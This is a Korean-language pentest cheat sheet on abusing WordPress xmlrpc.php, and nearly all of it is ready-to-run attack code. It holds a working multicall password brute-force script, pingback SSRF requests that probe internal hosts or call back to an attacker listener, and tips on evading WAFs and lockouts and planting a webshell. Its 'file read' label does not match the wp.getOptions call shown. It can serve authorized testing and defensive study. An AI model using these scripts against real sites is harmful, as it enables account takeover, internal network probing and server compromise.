# 05_xmlrpc악용

# WordPress — xmlrpc.php 악용

WordPress XML-RPC API를 통한 브루트포스 증폭, SSRF, 명령 실행.

---

## 활성 여부 확인

```bash
curl -X POST \
  -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" \
  http://<IP>/xmlrpc.php

# 응답에 메서드 목록이 오면 활성
# <string>wp.getUsersBlogs</string>
# <string>wp.newPost</string> ...
```

---

## 브루트포스 증폭 (multicall)

1 HTTP 요청에 수백 개의 패스워드를 한번에 시도. WAF 우회에도 효과적.

```python
# multicall_brute.py
import requests

url = "http://<IP>/xmlrpc.php"
username = "admin"

with open("passwords.txt") as f:
    passwords = f.read().splitlines()

# 100개씩 묶어서 전송
chunk_size = 100
for i in range(0, len(passwords), chunk_size):
    chunk = passwords[i:i+chunk_size]

    calls = ""
    for pwd in chunk:
        calls += f"""
        <value><struct>
          <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
          <member><name>params</name><value><array><data>
            <value><string>{username}</string></value>
            <value><string>{pwd}</string></value>
          </data></array></value></member>
        </struct></value>"""

    payload = f"""<?xml version="1.0"?>
    <methodCall><methodName>system.multicall</methodName>
    <params><param><value><array><data>
{calls}
    </data></array></value></param></params></methodCall>"""

    r = requests.post(url, data=payload)
    if "isAdmin" in r.text:
        print(f"[+] Password found in chunk starting at index{i}")
        break
```

---

## SSRF (Server-Side Request Forgery)

pingback.ping을 통한 내부 포트 스캔 및 SSRF

```bash
# pingback.ping으로 내부 호스트 탐색
curl -X POST \
  -d '<?xml version="1.0"?>
  <methodCall><methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://internal-host:8080/</string></value></param>
    <param><value><string>http://<IP>/</string></value></param>
  </params></methodCall>' \
  http://<IP>/xmlrpc.php

# 칼리 서버로 요청 유도 (외부 연결 확인)
# nc -lvnp 80
curl -X POST \
  -d '<?xml version="1.0"?>
  <methodCall><methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://<칼리IP>/</string></value></param>
    <param><value><string>http://<IP>/</string></value></param>
  </params></methodCall>' \
  http://<IP>/xmlrpc.php
```

---

## 파일 읽기 (wp.getOptions)

```bash
curl -X POST \
  -d '<?xml version="1.0"?>
  <methodCall><methodName>wp.getOptions</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>admin</string></value></param>
    <param><value><string>password</string></value></param>
    <param><value><array><data></data></array></value></param>
  </params></methodCall>' \
  http://<IP>/xmlrpc.php
```

---

## 팁

- xmlrpc.php 비활성화 메시지가 와도 pingback은 따로 작동하는 경우 있음
- multicall 방식은 단일 IP 락아웃 우회에도 유용
- 관리자 자격증명 획득 시 wp.newPost로 웹쉘 포함 게시물 작성 가능